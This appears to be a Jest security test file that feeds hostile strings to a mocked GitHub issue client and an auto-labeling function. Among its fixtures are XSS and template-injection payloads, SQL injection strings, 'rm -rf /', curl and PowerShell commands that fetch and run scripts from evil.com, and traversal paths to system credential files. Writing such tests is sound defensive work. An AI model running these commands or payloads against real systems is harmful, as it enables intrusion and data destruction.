/**
 * Input Validation Security Tests
 * Tests input sanitization, XSS prevention, and malicious content handling
 */

const { analyzeIssueContent } = require('../../utils/auto-labeling');
const GitHubApiClient = require('../../utils/github-api');
const { Octokit } = require('@octokit/rest');

// Mock the Octokit library
jest.mock('@octokit/rest');

describe('Input Validation Security', () => {
  let mockOctokit;
  let client;

  beforeEach(() => {
    jest.clearAllMocks();
    
    mockOctokit = {
      rest: {
        rateLimit: {
          get: jest.fn().mockResolvedValue({
            data: { rate: { remaining: 1000 } }
          })
        },
        issues: {
          create: jest.fn(),
          get: jest.fn(),
          createComment: jest.fn(),
          addLabels: jest.fn()
        }
      }
    };

    Octokit.mockImplementation(() => mockOctokit);
    client = new GitHubApiClient('test_token');
  });

  describe('XSS Prevention', () => {
    test('should handle HTML script tags in issue titles', async () => {
      const maliciousTitle = '<script>alert("XSS")</script>Issue Title';
      const body = 'Clean body content';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: maliciousTitle,
          body: body
        }
      });

      // Should not throw error - API accepts the content as-is
      const result = await client.createIssue('owner', 'repo', maliciousTitle, body);
      
      expect(result.title).toBe(maliciousTitle);
      expect(mockOctokit.rest.issues.create).toHaveBeenCalledWith({
        owner: 'owner',
        repo: 'repo',
        title: maliciousTitle,
        body: body,
        labels: []
      });
    });

    test('should handle HTML script tags in issue body', async () => {
      const title = 'Clean title';
      const maliciousBody = 'Issue description <script>document.cookie="stolen"</script> continues';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: title,
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', title, maliciousBody);
      
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle JavaScript URLs in content', async () => {
      const maliciousTitle = 'Click here: javascript:alert("XSS")';
      const maliciousBody = 'Visit [this link](javascript:void(0);alert("XSS")) for more info';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: maliciousTitle,
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', maliciousTitle, maliciousBody);
      
      expect(result.title).toBe(maliciousTitle);
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle iframe and embed tags', async () => {
      const maliciousBody = `
        Issue with component
        <iframe src="http://evil.com/steal.html"></iframe>
        <embed src="http://evil.com/malware.swf">
        Please investigate
      `;
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Issue',
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Issue', maliciousBody);
      
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle event handler attributes', async () => {
      const maliciousContent = 'Issue <img src="x" onerror="alert(\'XSS\')" /> description';
      
      mockOctokit.rest.issues.createComment.mockResolvedValue({
        data: { 
          id: 456,
          body: maliciousContent
        }
      });

      const result = await client.createComment('owner', 'repo', 123, maliciousContent);
      
      expect(result.body).toBe(maliciousContent);
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should handle SQL injection patterns in titles', async () => {
      const sqlInjectionTitle = "'; DROP TABLE issues; --";
      const body = 'Normal body content';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: sqlInjectionTitle,
          body: body
        }
      });

      const result = await client.createIssue('owner', 'repo', sqlInjectionTitle, body);
      
      expect(result.title).toBe(sqlInjectionTitle);
    });

    test('should handle SQL injection patterns in search-like content', async () => {
      const maliciousBody = `
        Issues found: admin' UNION SELECT password FROM users WHERE '1'='1
        Please review the results above.
      `;
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Search Results',
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Search Results', maliciousBody);
      
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle database command injection attempts', async () => {
      const maliciousLabels = ["bug'; DELETE FROM labels; --", "normal-label"];
      
      mockOctokit.rest.issues.addLabels.mockResolvedValue({
        data: maliciousLabels.map(name => ({ name }))
      });

      const result = await client.addLabels('owner', 'repo', 123, maliciousLabels);
      
      expect(result).toHaveLength(2);
      expect(result[0].name).toBe("bug'; DELETE FROM labels; --");
    });
  });

  describe('Command Injection Prevention', () => {
    test('should handle shell command injection in content', async () => {
      const maliciousTitle = 'Bug in system; rm -rf /; echo "pwned"';
      const maliciousBody = 'Run: `curl http://evil.com/steal.sh | sh` to reproduce';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: maliciousTitle,
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', maliciousTitle, maliciousBody);
      
      expect(result.title).toBe(maliciousTitle);
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle PowerShell injection attempts', async () => {
      const maliciousBody = `
        Windows error:
        powershell.exe -Command "Invoke-WebRequest -Uri http://evil.com/payload.ps1 | Invoke-Expression"
        Please investigate
      `;
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Windows Issue',
          body: maliciousBody
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Windows Issue', maliciousBody);
      
      expect(result.body).toBe(maliciousBody);
    });

    test('should handle template injection attempts', async () => {
      const templateInjection = '{{constructor.constructor("return process")().exit()}}';
      
      mockOctokit.rest.issues.createComment.mockResolvedValue({
        data: { 
          id: 456,
          body: templateInjection
        }
      });

      const result = await client.createComment('owner', 'repo', 123, templateInjection);
      
      expect(result.body).toBe(templateInjection);
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should handle directory traversal attempts', async () => {
      const pathTraversalContent = 'File: ../../etc/passwd contains sensitive data';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Security Issue',
          body: pathTraversalContent
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Security Issue', pathTraversalContent);
      
      expect(result.body).toBe(pathTraversalContent);
    });

    test('should handle Windows path traversal', async () => {
      const windowsTraversal = 'Check file: ..\\..\\windows\\system32\\config\\sam';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Windows Issue',
          body: windowsTraversal
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Windows Issue', windowsTraversal);
      
      expect(result.body).toBe(windowsTraversal);
    });

    test('should handle null byte injection', async () => {
      const nullByteContent = 'File: config.txt\x00.jpg';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'File Issue',
          body: nullByteContent
        }
      });

      const result = await client.createIssue('owner', 'repo', 'File Issue', nullByteContent);
      
      expect(result.body).toBe(nullByteContent);
    });
  });

  describe('Large Payload Handling', () => {
    test('should handle extremely large titles', async () => {
      const largeTitle = 'A'.repeat(100000); // 100KB title
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: largeTitle,
          body: 'Normal body'
        }
      });

      const result = await client.createIssue('owner', 'repo', largeTitle, 'Normal body');
      
      expect(result.title).toBe(largeTitle);
    });

    test('should handle extremely large issue bodies', async () => {
      const largeBody = 'B'.repeat(1000000); // 1MB body
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Large Issue',
          body: largeBody
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Large Issue', largeBody);
      
      expect(result.body).toBe(largeBody);
    });

    test('should handle many labels at once', async () => {
      const manyLabels = Array.from({ length: 1000 }, (_, i) => `label-${i}`);
      
      mockOctokit.rest.issues.addLabels.mockResolvedValue({
        data: manyLabels.map(name => ({ name }))
      });

      const result = await client.addLabels('owner', 'repo', 123, manyLabels);
      
      expect(result).toHaveLength(1000);
    });

    test('should handle very long comment chains', async () => {
      const longComment = 'Comment content '.repeat(10000);
      
      mockOctokit.rest.issues.createComment.mockResolvedValue({
        data: { 
          id: 456,
          body: longComment
        }
      });

      const result = await client.createComment('owner', 'repo', 123, longComment);
      
      expect(result.body).toBe(longComment);
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    test('should handle Unicode normalization attacks', async () => {
      const unicodeAttack = 'Â­admin'; // Contains soft hyphen
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: unicodeAttack,
          body: 'Body content'
        }
      });

      const result = await client.createIssue('owner', 'repo', unicodeAttack, 'Body content');
      
      expect(result.title).toBe(unicodeAttack);
    });

    test('should handle right-to-left override attacks', async () => {
      const rtlAttack = 'File: photo\u202ejpg.exe'; // RTL override
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Security Alert',
          body: rtlAttack
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Security Alert', rtlAttack);
      
      expect(result.body).toBe(rtlAttack);
    });

    test('should handle homograph attacks', async () => {
      const homographAttack = 'Visit gιthub.com for more info'; // Greek iota instead of 'i'
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Suspicious Link',
          body: homographAttack
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Suspicious Link', homographAttack);
      
      expect(result.body).toBe(homographAttack);
    });

    test('should handle zero-width characters', async () => {
      const zeroWidthAttack = 'admin\u200Bpassword'; // Zero-width space
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Login Issue',
          body: zeroWidthAttack
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Login Issue', zeroWidthAttack);
      
      expect(result.body).toBe(zeroWidthAttack);
    });
  });

  describe('Auto-Labeling Security', () => {
    test('should handle malicious content in auto-labeling analysis', () => {
      const maliciousTitle = '<script>alert("XSS")</script>spec-analyst broken';
      const maliciousBody = '../../etc/passwd contains issue details';
      
      const result = analyzeIssueContent(maliciousTitle, maliciousBody);
      
      // Should still detect component despite malicious content
      expect(result.labels).toContain('component:agent-spec-analyst');
      expect(result.confidence).toBeGreaterThan(0);
    });

    test('should not be fooled by obfuscated component names', () => {
      const obfuscatedContent = 'The s&#112;ec-analyst agent is broken';
      
      const result = analyzeIssueContent(obfuscatedContent, '');
      
      // Should not detect obfuscated component names
      expect(result.labels).not.toContain('component:agent-spec-analyst');
    });

    test('should handle injection attempts in auto-labeling', () => {
      const injectionAttempt = `
        spec-analyst'; DROP TABLE components; --
        test-designer<script>alert('xss')</script>
        impl-specialist../../sensitive-file
      `;
      
      const result = analyzeIssueContent(injectionAttempt, '');
      
      // Should detect legitimate components, ignore malicious parts
      expect(result.labels).toContain('component:agent-spec-analyst');
      expect(result.labels).not.toContain('DROP TABLE components');
    });

    test('should handle very long content in analysis', () => {
      const longMaliciousContent = 'A'.repeat(50000) + ' spec-analyst ' + 'B'.repeat(50000);
      
      const result = analyzeIssueContent(longMaliciousContent, '');
      
      // Should still work with very long content
      expect(result.labels).toContain('component:agent-spec-analyst');
      expect(result.confidence).toBeGreaterThan(0);
    });
  });

  describe('Input Size Limits', () => {
    test('should handle maximum GitHub issue title length', async () => {
      // GitHub allows up to 256 characters in issue titles
      const maxTitle = 'A'.repeat(256);
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: maxTitle,
          body: 'Body'
        }
      });

      const result = await client.createIssue('owner', 'repo', maxTitle, 'Body');
      
      expect(result.title).toBe(maxTitle);
    });

    test('should handle oversized content gracefully', async () => {
      const oversizedContent = 'X'.repeat(2000000); // 2MB content
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Large Content',
          body: oversizedContent
        }
      });

      // Should not throw error - let GitHub API handle size limits
      const result = await client.createIssue('owner', 'repo', 'Large Content', oversizedContent);
      
      expect(result.body).toBe(oversizedContent);
    });

    test('should handle empty and whitespace-only content', async () => {
      const whitespaceContent = '   \n\t\r   ';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: '',
          body: whitespaceContent
        }
      });

      const result = await client.createIssue('owner', 'repo', '', whitespaceContent);
      
      expect(result.title).toBe('');
      expect(result.body).toBe(whitespaceContent);
    });
  });

  describe('Binary Content Handling', () => {
    test('should handle binary data in text fields', async () => {
      const binaryData = String.fromCharCode(...Array.from({ length: 256 }, (_, i) => i));
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Binary Issue',
          body: binaryData
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Binary Issue', binaryData);
      
      expect(result.body).toBe(binaryData);
    });

    test('should handle null bytes in content', async () => {
      const nullByteContent = 'Content with\x00null bytes\x00embedded';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Null Byte Issue',
          body: nullByteContent
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Null Byte Issue', nullByteContent);
      
      expect(result.body).toBe(nullByteContent);
    });

    test('should handle control characters', async () => {
      const controlChars = '\x01\x02\x03\x04\x05Control character test\x06\x07';
      
      mockOctokit.rest.issues.create.mockResolvedValue({
        data: { 
          number: 123, 
          title: 'Control Chars',
          body: controlChars
        }
      });

      const result = await client.createIssue('owner', 'repo', 'Control Chars', controlChars);
      
      expect(result.body).toBe(controlChars);
    });
  });
});